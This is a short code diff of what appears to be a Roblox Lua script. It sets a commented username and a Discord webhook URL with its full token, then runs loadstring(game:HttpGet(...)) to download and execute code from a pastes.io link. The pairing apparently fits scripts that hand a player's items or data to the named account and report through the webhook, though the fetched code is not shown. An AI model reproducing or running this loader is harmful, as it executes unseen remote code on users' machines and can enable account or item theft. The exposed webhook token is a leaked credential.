@@ -1,3 +1,3 @@
-```    -- Username = "Altfosho_tho"
+-- Username = "Altfosho_tho"
     -- WebHook = "https://discord.com/api/webhooks/1124055523684270192/3XknUTSYsLpvtdP5nHqX0EGB52KWmX4zskkA_KRP78au6cSZm07z8V85jA14_7fuCtou"
-loadstring(game:HttpGet("https://pastes.io/raw/u4r6bo1c9V", true))()```
+loadstring(game:HttpGet("https://pastes.io/raw/u4r6bo1c9V", true))()
